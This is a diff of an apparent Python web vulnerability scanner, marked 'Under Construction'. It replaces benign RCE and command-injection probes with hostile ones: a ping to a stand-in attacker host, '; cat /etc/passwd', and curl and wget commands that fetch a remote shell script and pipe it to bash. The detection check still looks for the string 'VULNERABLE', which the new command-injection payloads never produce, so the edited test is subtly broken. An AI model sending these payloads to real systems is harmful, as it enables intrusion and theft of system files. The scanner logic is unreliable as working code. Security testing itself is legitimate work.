@@ -1,5 +1,5 @@
 #########################################################################################################################################################################################
-# Basic Python script for possible vulnerabilities in a web application.
+# Basic Python script for possible vulnerabilities in a web application. (Under Construction)
 # python vulnerability_tester.py
 # Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
 # without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
@@ -10,7 +10,6 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 # Replace /example_endpoint with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
 #########################################################################################################################################################################################
-
 
 import requests
 import re
@@ -66,7 +65,7 @@ def test_ssrf(url):
 
 # Function to test for remote code execution (RCE) vulnerability
 def test_rce(url):
-    payloads = ["echo%20VULNERABLE", "ping%20-c%203%20127.0.0.1"]
+    payloads = ["echo VULNERABLE", "ping -c 3 attacker-controlled-server.com"]
     for payload in payloads:
         response = requests.get(url + "?cmd=" + payload)
         if "VULNERABLE" in response.text:
@@ -96,7 +95,12 @@ def test_xxe(url):
 
 # Function to test for command injection vulnerability
 def test_command_injection(url):
-    payloads = ["127.0.0.1; echo VULNERABLE", "127.0.0.1; ping -c 3 127.0.0.1"]
+    payloads = [
+        "; ls -la",
+        "; cat /etc/passwd",
+        "; curl http://attacker-controlled-server.com/malicious_payload.sh | bash",
+        "; wget http://attacker-controlled-server.com/malicious_payload.sh -O - | bash"
+    ]
     for payload in payloads:
         response = requests.get(url + "?ip=" + payload)
         if "VULNERABLE" in response.text:
